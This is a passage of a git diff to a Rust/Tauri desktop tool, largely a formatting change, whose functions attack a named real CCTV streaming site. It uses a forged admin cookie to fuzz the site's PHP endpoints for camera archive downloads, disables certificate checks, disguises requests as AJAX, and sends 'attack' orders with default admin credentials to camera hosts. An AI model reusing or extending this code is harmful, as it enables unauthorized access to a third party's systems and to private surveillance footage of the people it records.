+            user_id, channel_id, date
+        ),
+        format!(
+            "https://videodvor.by/stream/download.php?user={}&cam={}&date={}",
+            user_id, channel_id, date
+        ),
+        format!(
+            "https://videodvor.by/stream/stream.php?user={}&cam={}&date={}&archive=1",
+            user_id, channel_id, date
+        ),
+        format!(
+            "https://videodvor.by/stream/get.php?user={}&cam={}&date={}",
+            user_id, channel_id, date
+        ),
         // Прямые FTP-пути через PHP-прокси
-        format!("https://videodvor.by/stream/ajax.php?action=download&path={}", urlencoding::encode(&ftp_path)),
-        format!("https://videodvor.by/stream/video.php?file={}", urlencoding::encode(&ftp_path)),
+        format!(
+            "https://videodvor.by/stream/ajax.php?action=download&path={}",
+            urlencoding::encode(&ftp_path)
+        ),
+        format!(
+            "https://videodvor.by/stream/video.php?file={}",
+            urlencoding::encode(&ftp_path)
+        ),
     ];
 
     // =====================================================
@@ -4499,7 +5114,9 @@ async fn recon_hub_archive_routes(
     ];
 
     // --- Выполняем GET-запросы ---
-    let all_get_urls: Vec<(String, &str)> = rtsp_variants.iter().map(|u| (u.clone(), "rtsp2mjpeg"))
+    let all_get_urls: Vec<(String, &str)> = rtsp_variants
+        .iter()
+        .map(|u| (u.clone(), "rtsp2mjpeg"))
         .chain(check_variants.iter().map(|u| (u.clone(), "check")))
         .chain(other_endpoints.iter().map(|u| (u.clone(), "other")))
         .collect();
@@ -4509,9 +5126,15 @@ async fn recon_hub_archive_routes(
         let dominated = probe.verdict.clone();
         results.push(probe);
 
-        push_runtime_log(&log_state, format!(
-            "  {} {} → {}", "GET", &url[url.len().saturating_sub(60)..], dominated
-        ));
+        push_runtime_log(
+            &log_state,
+            format!(
+                "  {} {} → {}",
+                "GET",
+                &url[url.len().saturating_sub(60)..],
+                dominated
+            ),
+        );
     }
 
     // --- Выполняем POST-запросы ---
@@ -4520,18 +5143,35 @@ async fn recon_hub_archive_routes(
         let dominated = probe.verdict.clone();
         results.push(probe);
 
-        push_runtime_log(&log_state, format!(
-            "  POST {} → {}", &pp.url[pp.url.len().saturating_sub(40)..], dominated
-        ));
+        push_runtime_log(
+            &log_state,
+            format!(
+                "  POST {} → {}",
+                &pp.url[pp.url.len().saturating_sub(40)..],
+                dominated
+            ),
+        );
     }
 
     // Сортируем: видео/интересные результаты наверху
-    results.sort_by(|a, b| b.is_video.cmp(&a.is_video).then(b.content_length.cmp(&a.content_length)));
+    results.sort_by(|a, b| {
+        b.is_video
+            .cmp(&a.is_video)
+            .then(b.content_length.cmp(&a.content_length))
+    });
 
-    let hits = results.iter().filter(|r| r.is_video || r.is_redirect).count();
-    push_runtime_log(&log_state, format!(
-        "✅ Разведка завершена: {} маршрутов проверено, {} потенциальных попаданий", results.len(), hits
-    ));
+    let hits = results
+        .iter()
+        .filter(|r| r.is_video || r.is_redirect)
+        .count();
+    push_runtime_log(
+        &log_state,
+        format!(
+            "✅ Разведка завершена: {} маршрутов проверено, {} потенциальных попаданий",
+            results.len(),
+            hits
+        ),
+    );
 
     Ok(results)
 }
@@ -4560,7 +5200,8 @@ async fn probe_url(
 
         let resp = req.send().await.map_err(|e| e.to_string())?;
         let status = resp.status().as_u16();
-        let content_type = resp.headers()
+        let content_type = resp
+            .headers()
             .get("content-type")
             .and_then(|v| v.to_str().ok())
             .unwrap_or("")
@@ -4568,7 +5209,8 @@ async fn probe_url(
         let content_length = resp.content_length().unwrap_or(0);
 
         let is_redirect = status >= 300 && status < 400;
-        let redirect_to = resp.headers()
+        let redirect_to = resp
+            .headers()
             .get("location")
             .and_then(|v| v.to_str().ok())
             .unwrap_or("")
@@ -4594,9 +5236,17 @@ async fn probe_url(
             "🎯 ВИДЕО ОБНАРУЖЕНО".into()
         } else if is_redirect && !redirect_to.is_empty() {
             format!("↗️ РЕДИРЕКТ → {}", redirect_to)
-        } else if status == 200 && (body_preview.contains(".mkv") || body_preview.contains(".mp4") || body_preview.contains("video")) {
+        } else if status == 200
+            && (body_preview.contains(".mkv")
+                || body_preview.contains(".mp4")
+                || body_preview.contains("video"))
+        {
             "💡 СОДЕРЖИТ ССЫЛКИ НА ВИДЕО".into()
-        } else if status == 200 && !body_preview.is_empty() && body_preview.len() > 10 && !body_preview.contains("<!DOCTYPE") {
+        } else if status == 200
+            && !body_preview.is_empty()
+            && body_preview.len() > 10
+            && !body_preview.contains("<!DOCTYPE")
+        {
             "📋 ДАННЫЕ (не HTML)".into()
         } else if status == 403 || status == 401 {
             "🔒 ДОСТУП ЗАПРЕЩЁН".into()
@@ -4620,7 +5270,8 @@ async fn probe_url(
             body_preview,
             verdict,
         })
-    }.await;
+    }
+    .await;
 
     result.unwrap_or_else(|e| ArchiveRouteProbe {
         url: url.to_string(),
@@ -4646,7 +5297,8 @@ async fn nemesis_auto_login(username: String, password: String) -> Result<String
 
     let login_data = [("user", username), ("pass", password)];
 
-    let resp = client.post("https://videodvor.by/stream/check.php")
+    let resp = client
+        .post("https://videodvor.by/stream/check.php")
         .form(&login_data)
         .send()
         .await
@@ -4690,9 +5342,12 @@ struct WebAnalysisResult {
 async fn nemesis_analyze_web_sources(
     target_url: String,
     admin_hash: String,
-    log_state: State<'_, LogState>
+    log_state: State<'_, LogState>,
 ) -> Result<WebAnalysisResult, String> {
-    push_runtime_log(&log_state, format!("🕷️ Анализ исходного кода (DOM) запущен: {}", target_url));
+    push_runtime_log(
+        &log_state,
+        format!("🕷️ Анализ исходного кода (DOM) запущен: {}", target_url),
+    );
 
     let client = reqwest::Client::builder()
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
@@ -4700,7 +5355,8 @@ async fn nemesis_analyze_web_sources(
         .build()
         .map_err(|e| e.to_string())?;
 
-    let resp = client.get(&target_url)
+    let resp = client
+        .get(&target_url)
         .header("Cookie", format!("login=mvd; admin={}", admin_hash))
         .send()
         .await
@@ -4722,40 +5378,66 @@ async fn nemesis_analyze_web_sources(
     // 1. Ищем все формы отправки (куда уходят данные)
     let form_re = Regex::new(r#"<form[^>]+action=["']([^"']+)["'][^>]*>"#).unwrap();
     for cap in form_re.captures_iter(&html) {
-        if let Some(m) = cap.get(1) { result.forms.push(m.as_str().to_string()); }
+        if let Some(m) = cap.get(1) {
+            result.forms.push(m.as_str().to_string());
+        }
     }
 
     // 2. Ищем все поля ввода (названия параметров)
     let input_re = Regex::new(r#"<input[^>]+name=["']([^"']+)["'][^>]*>"#).unwrap();
     for cap in input_re.captures_iter(&html) {
-        if let Some(m) = cap.get(1) { result.inputs.push(m.as_str().to_string()); }
+        if let Some(m) = cap.get(1) {
+            result.inputs.push(m.as_str().to_string());
+        }
     }
 
     // 3. Ищем подключенные скрипты
     let script_re = Regex::new(r#"<script[^>]+src=["']([^"']+)["'][^>]*>"#).unwrap();
     for cap in script_re.captures_iter(&html) {
-        if let Some(m) = cap.get(1) { result.scripts.push(m.as_str().to_string()); }
+        if let Some(m) = cap.get(1) {
+            result.scripts.push(m.as_str().to_string());
+        }
     }
 
     // 4. Ищем скрытые AJAX-запросы прямо в коде страницы
-    let ajax_re = Regex::new(r#"(\$\.ajax|\$\.post|\$\.get|fetch|XMLHttpRequest)[^>]*?['"]([^'"]+\.php[^'"]*)['"]"#).unwrap();
+    let ajax_re = Regex::new(
+        r#"(\$\.ajax|\$\.post|\$\.get|fetch|XMLHttpRequest)[^>]*?['"]([^'"]+\.php[^'"]*)['"]"#,
+    )
+    .unwrap();
     for cap in ajax_re.captures_iter(&html) {
-        if let Some(m) = cap.get(2) { result.api_endpoints.push(m.as_str().to_string()); }
+        if let Some(m) = cap.get(2) {
+            result.api_endpoints.push(m.as_str().to_string());
+        }
     }
 
     // Очищаем от дубликатов
-    result.forms.sort(); result.forms.dedup();
-    result.inputs.sort(); result.inputs.dedup();
-    result.scripts.sort(); result.scripts.dedup();
-    result.api_endpoints.sort(); result.api_endpoints.dedup();
+    result.forms.sort();
+    result.forms.dedup();
+    result.inputs.sort();
+    result.inputs.dedup();
+    result.scripts.sort();
+    result.scripts.dedup();
+    result.api_endpoints.sort();
+    result.api_endpoints.dedup();
 
-    push_runtime_log(&log_state, format!("✅ Найдено: {} форм, {} параметров, {} API", result.forms.len(), result.inputs.len(), result.api_endpoints.len()));
+    push_runtime_log(
+        &log_state,
+        format!(
+            "✅ Найдено: {} форм, {} параметров, {} API",
+            result.forms.len(),
+            result.inputs.len(),
+            result.api_endpoints.len()
+        ),
+    );
 
     Ok(result)
 }
 
 #[tauri::command]
-async fn nemesis_fuzz_archive_endpoint(admin_hash: String, target_ftp_path: String) -> Result<Vec<String>, String> {
+async fn nemesis_fuzz_archive_endpoint(
+    admin_hash: String,
+    target_ftp_path: String,
+) -> Result<Vec<String>, String> {
     let client = reqwest::Client::builder()
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
         .danger_accept_invalid_certs(true)
@@ -4763,18 +5445,52 @@ async fn nemesis_fuzz_archive_endpoint(admin_hash: String, target_ftp_path: Stri
         .map_err(|e| e.to_string())?;
 
     let mut successful_hits = Vec::new();
-    let endpoints = vec!["rtsp2mjpeg.php", "ajax.php", "test.php", "check.php", "get.php", "video.php", "archive.php", "stream.php", "api.php"];
-    let param_names = vec!["file", "path", "src", "video", "archive_path", "url", "id", "name", "target"];
+    let endpoints = vec![
+        "rtsp2mjpeg.php",
+        "ajax.php",
+        "test.php",
+        "check.php",
+        "get.php",
+        "video.php",
+        "archive.php",
+        "stream.php",
+        "api.php",
+    ];
+    let param_names = vec![
+        "file",
+        "path",
+        "src",
+        "video",
+        "archive_path",
+        "url",
+        "id",
+        "name",
+        "target",
+    ];
 
     for endpoint in endpoints {
         for param in &param_names {
-            let url = format!("https://videodvor.by/stream/{}?{}={}&get=1", endpoint, param, target_ftp_path);
-            if let Ok(resp) = client.get(&url).header("Cookie", format!("login=mvd; admin={}", admin_hash)).send().await {
+            let url = format!(
+                "https://videodvor.by/stream/{}?{}={}&get=1",
+                endpoint, param, target_ftp_path
+            );
+            if let Ok(resp) = client
+                .get(&url)
+                .header("Cookie", format!("login=mvd; admin={}", admin_hash))
+                .send()
+                .await
+            {
                 let status = resp.status();
                 let len = resp.content_length().unwrap_or(0);
-                let ctype = resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("");
+                let ctype = resp
+                    .headers()
+                    .get("content-type")
+                    .and_then(|v| v.to_str().ok())
+                    .unwrap_or("");
 
-                if status.is_success() && (ctype.contains("video") || ctype.contains("octet-stream") || len > 500_000) {
+                if status.is_success()
+                    && (ctype.contains("video") || ctype.contains("octet-stream") || len > 500_000)
+                {
                     successful_hits.push(format!("🎯 УСПЕХ (ВИДЕО): {}", url));
                 } else if status.is_success() && len > 0 {
                     let body = resp.text().await.unwrap_or_default();
@@ -4786,14 +5502,19 @@ async fn nemesis_fuzz_archive_endpoint(admin_hash: String, target_ftp_path: Stri
         }
     }
     if successful_hits.is_empty() {
-        Ok(vec!["GET-сканирование завершено. Прямых точек входа не найдено.".to_string()])
+        Ok(vec![
+            "GET-сканирование завершено. Прямых точек входа не найдено.".to_string(),
+        ])
     } else {
         Ok(successful_hits)
     }
 }
 
 #[tauri::command]
-async fn nemesis_fuzz_post_endpoints(admin_hash: String, target_ftp_path: String) -> Result<Vec<String>, String> {
+async fn nemesis_fuzz_post_endpoints(
+    admin_hash: String,
+    target_ftp_path: String,
+) -> Result<Vec<String>, String> {
     let client = reqwest::Client::builder()
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
         .danger_accept_invalid_certs(true)
@@ -4801,7 +5522,14 @@ async fn nemesis_fuzz_post_endpoints(admin_hash: String, target_ftp_path: String
         .map_err(|e| e.to_string())?;
 
     let mut successful_hits = Vec::new();
-    let endpoints = vec!["ajax.php", "check.php", "get.php", "rtsp2mjpeg.php", "api.php", "video.php"];
+    let endpoints = vec![
+        "ajax.php",
+        "check.php",
+        "get.php",
+        "rtsp2mjpeg.php",
+        "api.php",
+        "video.php",
+    ];
     let param_names = vec!["path", "file", "url", "target", "src"];
     let actions = vec!["download", "get_video", "fetch", "load", "archive"];
 
@@ -4809,9 +5537,13 @@ async fn nemesis_fuzz_post_endpoints(admin_hash: String, target_ftp_path: String
         for param in &param_names {
             for action in &actions {
                 let url = format!("https://videodvor.by/stream/{}", endpoint);
-                let payload = [(param.to_string(), target_ftp_path.clone()), ("action".to_string(), action.to_string())];
+                let payload = [
+                    (param.to_string(), target_ftp_path.clone()),
+                    ("action".to_string(), action.to_string()),
+                ];
 
-                if let Ok(resp) = client.post(&url)
+                if let Ok(resp) = client
+                    .post(&url)
                     .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                     .header("X-Requested-With", "XMLHttpRequest") // Маскируемся под AJAX
                     .form(&payload)
@@ -4820,14 +5552,27 @@ async fn nemesis_fuzz_post_endpoints(admin_hash: String, target_ftp_path: String
                 {
                     let status = resp.status();
                     let content_length = resp.content_length().unwrap_or(0);
-                    let content_type = resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("");
+                    let content_type = resp
+                        .headers()
+                        .get("content-type")
+                        .and_then(|v| v.to_str().ok())
+                        .unwrap_or("");
 
-                    if status.is_success() && (content_type.contains("video") || content_length > 500_000) {
-                        successful_hits.push(format!("🎯 POST-УСПЕХ (ВИДЕО) в {} [{}={}&action={}]", url, param, target_ftp_path, action));
+                    if status.is_success()
+                        && (content_type.contains("video") || content_length > 500_000)
+                    {
+                        successful_hits.push(format!(
+                            "🎯 POST-УСПЕХ (ВИДЕО) в {} [{}={}&action={}]",
+                            url, param, target_ftp_path, action
+                        ));
                     } else if status.is_success() && content_length > 0 {
                         let body = resp.text().await.unwrap_or_default();
                         if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
-                            successful_hits.push(format!("💡 POST-РЫЧАГ (ССЫЛКА) в {}: {}", url, &body.chars().take(150).collect::<String>()));
+                            successful_hits.push(format!(
+                                "💡 POST-РЫЧАГ (ССЫЛКА) в {}: {}",
+                                url,
+                                &body.chars().take(150).collect::<String>()
+                            ));
                         }
                     }
                 }
@@ -4843,8 +5588,14 @@ async fn nemesis_fuzz_post_endpoints(admin_hash: String, target_ftp_path: String
 }
 
 #[tauri::command]
-async fn analyze_security_headers(target_url: String, log_state: State<'_, LogState>) -> Result<Vec<String>, String> {
-    push_runtime_log(&log_state, format!("Аудит безопасности запущен для: {}", target_url));
+async fn analyze_security_headers(
+    target_url: String,
+    log_state: State<'_, LogState>,
+) -> Result<Vec<String>, String> {
+    push_runtime_log(
+        &log_state,
+        format!("Аудит безопасности запущен для: {}", target_url),
+    );
 
     let client = reqwest::Client::builder()
         .danger_accept_invalid_certs(true)
@@ -4854,7 +5605,11 @@ async fn analyze_security_headers(target_url: String, log_state: State<'_, LogSt
         .build()
         .map_err(|e| e.to_string())?;
 
-    let resp = client.get(&target_url).send().await.map_err(|e| e.to_string())?;
+    let resp = client
+        .get(&target_url)
+        .send()
+        .await
+        .map_err(|e| e.to_string())?;
     let headers = resp.headers();
     let mut analysis = Vec::new();
 
@@ -4870,7 +5625,10 @@ async fn analyze_security_headers(target_url: String, log_state: State<'_, LogSt
         analysis.push("🟢 CSP: Отсутствует (Уязвим к XSS)".into());
     }
 
-    let server_type = headers.get("server").and_then(|v| v.to_str().ok()).unwrap_or("Скрыт");
+    let server_type = headers
+        .get("server")
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("Скрыт");
     analysis.push(format!("ℹ️ Тип сервера: {}", server_type));
 
     Ok(analysis)
@@ -4885,7 +5643,7 @@ async fn run_nexus_protocol(
     login: Option<String>,
     pass: Option<String>,
     hyperion_state: tauri::State<'_, HyperionState>,
-    log_state: tauri::State<'_, LogState>
+    log_state: tauri::State<'_, LogState>,
 ) -> Result<serde_json::Value, String> {
     let clean_ip = normalize_host_for_scan(&ip);
     if clean_ip.is_empty() {
@@ -4895,7 +5653,13 @@ async fn run_nexus_protocol(
     let login = login.unwrap_or_else(|| "admin".into());
     let pass = pass.unwrap_or_default();
 
-    push_runtime_log(&log_state, format!("☢️ ПРИКАЗ ГЕНШТАБУ: Атаковать {} (login={})", clean_ip, login));
+    push_runtime_log(
+        &log_state,
+        format!(
+            "☢️ ПРИКАЗ ГЕНШТАБУ: Атаковать {} (login={})",
+            clean_ip, login
+        ),
+    );
 
     let tx = hyperion_state.master_tx.lock().await;
 
@@ -4904,7 +5668,9 @@ async fn run_nexus_protocol(
         port: 80,
         login,
         pass,
-    }).await.map_err(|e| format!("Ошибка связи с Генштабом: {}", e))?;
+    })
+    .await
+    .map_err(|e| format!("Ошибка связи с Генштабом: {}", e))?;
 
     Ok(serde_json::json!({
         "status": "COMMAND_ISSUED",
@@ -4934,7 +5700,10 @@ fn main() {
 
             // Отключаем кэширование для HLS (m3u8 и ts) — критично для live-стримов
             let mut headers = warp::http::HeaderMap::new();
-            headers.insert("Cache-Control", "no-cache, no-store, must-revalidate".parse().unwrap());
+            headers.insert(
+                "Cache-Control",
+                "no-cache, no-store, must-revalidate".parse().unwrap(),
+            );
             headers.insert("Pragma", "no-cache".parse().unwrap());
             headers.insert("Expires", "0".parse().unwrap());
             let no_cache = warp::reply::with::headers(headers);
@@ -4956,11 +5725,15 @@ fn main() {
         let _ = rt.block_on(async {
             let (master, log_rx) = nexus::HyperionMaster::boot_with_log_bridge();
             tx_setup.send((master.tx, log_rx)).unwrap();
-            loop { tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await; }
+            loop {
+                tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
+            }
         });
     });
 
-    let (master_tx, nexus_log_rx) = rx_setup.recv().expect("Критическая ошибка запуска ядра Hyperion");
+    let (master_tx, nexus_log_rx) = rx_setup
+        .recv()
+        .expect("Критическая ошибка запуска ядра Hyperion");
     let hyperion_state = HyperionState {
         master_tx: TokioMutex::new(master_tx),
     };
@@ -4986,7 +5759,9 @@ fn main() {
             }
         });
     });
-    let nexus_log_shared = NexusLogBridge { lines: nexus_log_state };
+    let nexus_log_shared = NexusLogBridge {
+        lines: nexus_log_state,
+    };
 
     tauri::Builder::default()
         .manage(hyperion_state)
@@ -5061,8 +5836,8 @@ fn main() {
             relay_list_files,
             relay_download_file
         ])
-    .run(tauri::generate_context!())
-    .expect("error while running tauri application");
+        .run(tauri::generate_context!())
+        .expect("error while running tauri application");
 } // <-- Вот здесь ровно один раз закрывается main()
 
 #[tauri::command]
